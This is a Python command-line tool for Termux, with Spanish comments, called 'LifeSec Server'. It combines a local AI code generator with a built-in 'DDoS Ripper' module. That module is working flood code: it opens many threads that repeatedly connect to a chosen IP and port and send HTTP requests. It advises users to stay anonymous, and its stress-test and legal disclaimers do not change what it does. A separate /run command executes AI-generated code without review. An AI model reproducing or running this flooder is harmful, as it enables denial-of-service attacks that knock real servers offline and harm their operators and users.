import os
import sys
import subprocess
import socket
import threading
import argparse
from ai_module import query_local_ai

# Colores para la terminal
GREEN = "\033[92m"
CYAN = "\033[96m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"

# Directorios de guardado locales
SAVE_DIR = os.path.expanduser("~/lifesec/projects")
EXPORT_DIR = "/sdcard/LifeSec"
os.makedirs(SAVE_DIR, exist_ok=True)
os.makedirs(EXPORT_DIR, exist_ok=True)

current_code = ""
current_filename = "index.html"

def banner():
    art = (
        f"{RED}"
        "██╗     ██╗███████╗███████╗███████╗███████╗ ██████╗\n"
        "██║     ██║██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝\n"
        "██║     ██║█████╗  █████╗  ╚████╗  █████╗  ██║     \n"
        "██║     ██║██╔══╝  ██╔══╝   ╚══██╗ ██╔══╝  ██║     \n"
        "███████╗██║██║     ███████╗██████╔╝███████╗╚██████╗\n"
        "╚══════╝╚═╝╚═╝     ╚══════╝╚══════╝╚══════╝ ╚═════╝"
        f"{RESET}"
    )
    print(art)
    print(f"{CYAN}[ LIFESEC SERVER ] Módulo IA Integrado (Offline){RESET}")
    print(f"{YELLOW}Comandos:{RESET} /new /save /list /run /ddos [-s IP -p PORT -t TURBO -q] /quit /help\n")

def run_ddos_attack(server, port, turbo, quiet):
    """Lógica de ejecución del ataque DDoS"""
    print(f"{RED}")
    print("DDOS RIPPER")
    print(f"{CYAN}©EngineRipper | reference by Hammer{RESET}")
    print(f"{YELLOW}")
    print("It is the end user's responsibility to obey all applicable laws.")
    print("It is just like a server testing script and Your ip is visible. Please, make sure you are anonymous!\n" + RESET)
    
    print(f"{GREEN}[INFO] Iniciando prueba de estrés en {server}:{port} con {turbo} hilos...{RESET}")
    
    def attack():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((server, port))
                s.sendto(b"GET / HTTP/1.1\r\n", (server, port))
                if not quiet:
                    print(f"{GREEN}[+] Paquete enviado a {server}:{port}{RESET}")
                s.close()
            except Exception:
                if not quiet:
                    print(f"{RED}[-] Error de conexión o servidor caído{RESET}")

    threads = []
    for _ in range(min(turbo, 100)): # Límite seguro para Termux
        t = threading.Thread(target=attack)
        t.daemon = True
        threads.append(t)
        t.start()
        
    input(f"{YELLOW}[*] Presiona ENTER para detener el ataque y volver al menú...{RESET}")

def ddos_ripper_module(arg_string=""):
    """Maneja los argumentos del DDoS Ripper, ya sea por comandos internos o interactivos."""
    import shlex
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("-s", "--server", type=str)
    parser.add_argument("-p", "--port", type=int, default=80)
    parser.add_argument("-t", "--turbo", type=int, default=135)
    parser.add_argument("-q", "--quiet", action="store_true")
    parser.add_argument("-h", "--help", action="store_true")

    try:
        args = parser.parse_args(shlex.split(arg_string))
    except Exception:
        print(f"{RED}[ERROR] Argumentos inválidos. Usa: /ddos -s <ip> -t <hilos>{RESET}")
        return

    if args.help:
        print(f"{CYAN}Uso de DDoS Ripper:{RESET}")
        print(f"  -s : IP del servidor objetivo")
        print(f"  -p : Puerto (default 80)")
        print(f"  -t : Turbo / Hilos (default 135)")
        print(f"  -q : Modo silencioso\n")
        return

    server = args.server
    if not server:
        server = input(f"{CYAN}Introduce la IP del servidor (-s) > {RESET}").strip()
        if not server:
            print(f"{RED}[ERROR] IP requerida.{RESET}")
            return

    port = args.port if args.port else 80
    turbo = args.turbo if args.turbo else 135
    quiet = args.quiet

    run_ddos_attack(server, port, turbo, quiet)

def main():
    global current_code, current_filename
    
    # Análisis de argumentos iniciales al arrancar el script completo de python
    parser = argparse.ArgumentParser(description="LifeSec Server con DDoS Ripper")
    parser.add_argument("-s", "--server", type=str)
    parser.add_argument("-p", "--port", type=int, default=80)
    parser.add_argument("-t", "--turbo", type=int, default=135)
    parser.add_argument("-q", "--quiet", action="store_true")
    
    # Separamos los argumentos del script para evitar conflictos con Termux
    known_args, unknown = parser.parse_known_args()
    
    if known_args.server:
        run_ddos_attack(known_args.server, known_args.port, known_args.turbo, known_args.quiet)
        return

    banner()
    
    while True:
        try:
            user_input = input(f"{RED}lifesec@termux > {RESET}").strip()
            if not user_input:
                continue
                
            parts = user_input.split(" ", 1)
            command = parts[0]
            args_str = parts[1] if len(parts) > 1 else ""
                
            if command == "/quit":
                print("Saliendo de LifeSec...")
                break
                
            elif command == "/help":
                banner()
                print(f"{CYAN}Opciones adicionales:{RESET}")
                print(f"  /ddos [-s IP -p PORT -t TURBO -q]  - Ejecutar DDoS Ripper")
                print(f"  /new                               - Generar código con IA")
                print(f"  /save                              - Guardar proyecto")
                print(f"  /list                              - Listar archivos")
                print(f"  /run                               - Ejecutar código actual\n")
                
            elif command == "/new":
                prompt = input(f"{CYAN}¿Qué deseas crear? > {RESET}")
                if prompt:
                    print(f"{CYAN}[INFO] Consultando al módulo de IA local...{RESET}")
                    code = query_local_ai(prompt, is_code_request=True)
                    if code:
                        current_code = code
                        current_filename = prompt.replace(" ", "_").lower()[:20] + ".py"
                        print(f"{GREEN}[SUCCESS] Código generado por el módulo IA.{RESET}")
                        print(f"{CYAN}[PREVIEW]:{RESET}\n" + current_code[:300] + "\n... [truncado]")
                        
            elif command == "/save":
                if not current_code:
                    print(f"{RED}[WARN] No hay código generado para guardar.{RESET}")
                    continue
                filepath = os.path.join(SAVE_DIR, current_filename)
                export_path = os.path.join(EXPORT_DIR, current_filename)
                
                with open(filepath, "w") as f:
                    f.write(current_code)
                with open(export_path, "w") as f:
                    f.write(current_code)
                    
                print(f"{GREEN}[SAVE] Interno: {filepath}{RESET}")
                print(f"{GREEN}[EXPORT] Almacenamiento: {export_path}{RESET}")
                
            elif command == "/list":
                print(f"{CYAN}--- Proyectos locales en {SAVE_DIR} ---{RESET}")
                if os.path.exists(SAVE_DIR):
                    for f in os.listdir(SAVE_DIR):
                        print(f" - {f}")
                else:
                    print("Carpeta vacía.")
                    
            elif command == "/run":
                if not current_code:
                    print(f"{RED}[WARN] No hay código activo para ejecutar.{RESET}")
                    continue
                temp_file = os.path.join(SAVE_DIR, "temp_run.py")
                with open(temp_file, "w") as f:
                    f.write(current_code)
                print(f"{CYAN}[RUN] Ejecutando código...{RESET}")
                try:
                    subprocess.run([sys.executable, temp_file])
                except Exception as e:
                    print(f"{RED}[ERROR] Fallo al ejecutar: {e}{RESET}")
                    
            elif command == "/ddos":
                ddos_ripper_module(args_str)
                    
            elif command.startswith("/"):
                print(f"{RED}[ERROR] Comando desconocido. Usa /help{RESET}")
            else:
                code = query_local_ai(user_input, is_code_request=False)
                if code:
                    print(f"{CYAN}[RESPUESTA]:\n{code}{RESET}")

        except KeyboardInterrupt:
            print("\nOperación cancelada.")
            break

if __name__ == "__main__":
    main()

